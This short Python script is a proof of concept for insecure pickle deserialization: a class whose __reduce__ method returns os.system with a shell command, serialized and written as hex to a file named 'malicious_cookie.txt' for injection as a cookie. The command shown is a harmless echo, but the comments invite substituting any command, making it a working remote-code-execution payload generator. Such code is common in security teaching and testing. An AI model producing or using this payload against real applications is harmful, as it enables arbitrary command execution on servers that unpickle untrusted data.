"""
Python pickle deserialization vulnerability example.
This script creates a malicious payload that, when deserialized,
executes a command on the system.
"""
import pickle
import os

class MaliciousClass:
    def __reduce__(self):
        return (os.system, ("echo 'Malicious command executed!'",))
        #this is a simple command that will be executed
        #you can replace it with any command you want
payload = pickle.dumps(MaliciousClass())
print(f"Payload: {payload.hex()}")

with open("malicious_cookie.txt", "w") as f:
    f.write(payload.hex())